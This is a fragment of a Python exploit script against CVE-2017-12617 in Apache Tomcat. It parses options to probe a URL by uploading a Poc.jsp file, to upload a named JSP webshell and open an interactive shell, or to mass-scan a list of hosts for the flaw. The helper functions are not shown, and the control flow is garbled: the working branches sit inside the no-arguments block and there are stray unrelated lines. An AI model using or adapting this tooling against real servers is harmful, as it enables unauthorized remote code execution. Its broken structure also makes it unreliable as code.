

(opt,args)=parse.parse_args()

if opt.U==None and opt.P==None and opt.L==None:
    print(parse.usage)

    if opt.U!=None and opt.P==None and opt.L==None:
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        url=str(opt.U)
        checker="Poc.jsp"
        print(bcolors.BOLD +"Poc Filename  {}".format(checker))
        createPayload(str(url)+"/",checker)
        con=getContent(str(url)+"/",checker)
        if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
            print(bcolors.WARNING+url+' it\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC)
            print(bcolors.WARNING+url+"/"+checker+bcolors.ENDC)

        else:
            print('Not Vulnerable to CVE-2017-12617 ')
    elif opt.P!=None and opt.U!=None and  opt.L==None:
        for i, l in enumerate(lines):
            num_chaps += 1
        FET_null()
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        pwn=str(opt.P)
        url=str(opt.U)
        print("Uploading Webshell .....")
        pwn=pwn+".jsp"
        RCE(str(url)+"/",pwn)
        shell(str(url),pwn)
    else:
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        w=str(opt.L)
        f=open(w,"r")
        print("Scaning hosts in {}".format(w))
        checker="Poc.jsp"
        for i in f.readlines():
            i=i.strip("\n")
            createPayload(str(i)+"/",checker)
            con=getContent(str(i)+"/",checker)
            if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                print(str(i)+"\033[91m"+" [ Vulnerable ] ""\033[0m")


else:
    parse.add_option("-u","--url",dest="U",type="string",help="Website Url")
    parse.add_option("-p","--pwn",dest="P",type="string",help="generate webshell and upload it")
    parse.add_option("-l","--list",dest="L",type="string",help="hosts File")
